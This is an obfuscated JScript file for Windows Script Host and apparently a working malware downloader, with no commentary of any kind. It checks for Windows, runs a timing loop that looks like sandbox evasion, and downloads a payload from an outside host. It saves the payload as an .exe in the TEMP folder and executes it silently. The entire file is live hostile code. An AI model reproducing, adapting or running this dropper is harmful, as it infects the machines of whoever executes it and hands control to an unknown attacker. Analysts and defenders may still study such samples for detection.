var sH = false;
var ov = "CreateObject";
var r = function dn() {return WScript[ov]("WScript.Shell");}(), Jr = 11;
var MC = "MSXML2.XMLHTTP";
var aS = 2123213;
var x = 0;
function C(HF){r["Run"](HF, x, x);};
function wc(){return "" + MC;};
function qg(im, c){x = x * 1; return im - c;};
function e(){return ov;};
/*@cc_on
  @if (@_win32 || @_win64)
    sH = true;
  @end
@*/
if (sH)
{
var C0 = "";
function f(){return 22;};
var S = 0; var lP = 0;
function d()
{
var V = new this["Date"]();
var P = V["getUTCMilliseconds"]();
WScript["Sleep"](f());
var V = new this["Date"]();
var fr = V["getUTCMilliseconds"]();
WScript["Sleep"](f());
var V = new this["Date"]();
var W = V["getUTCMilliseconds"]();
var S = "gn";
S = qg(fr, P);
var lP = "Yc";
lP = qg(W, fr);
C0 = "open";
return qg(S, lP);
}
var aR = false;
var W0 = false;
for (var b = x; b < f() * 1; b++){if (d() != x){
aR = true; 
lP = "31" + 11 * S + lP; 
W0 = true; 
break;
}}
function bo() {return ((aR == true) && (aR == W0)) ? 1 : x;};
if (aR && bo() && W0){
function YL() {return r["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "Rxl5He1QbYjll.exe";};
 NS = wc();
 F = WScript[ov](NS);
 var kq = 1;
 while (kq){
try {
F[C0]("GET", "http://kingsstaging.consines.in/l9osaw", false);
F["send"]();
A = "Sleep";
for (;;){WScript[A](f() * 11); if (F["readystate"] >= 2 * 2) break;};
kq = x;
} catch(ZZ){};
}
function Y(q) {var O = (1, 2, 3, 4, 5, q); return O;};
ks = WScript[e()]("ADODB.Stream");
NS = ks;
NS[C0]();
NS["type"] = Y(1);
NS["write"](F["ResponseBody"]);
ks["position"] = Y(x);
NS["Save" + "ToFile"](YL(), 2);
ks["c"+"lose"]();
Yy = YL();
C(Yy);
}
}

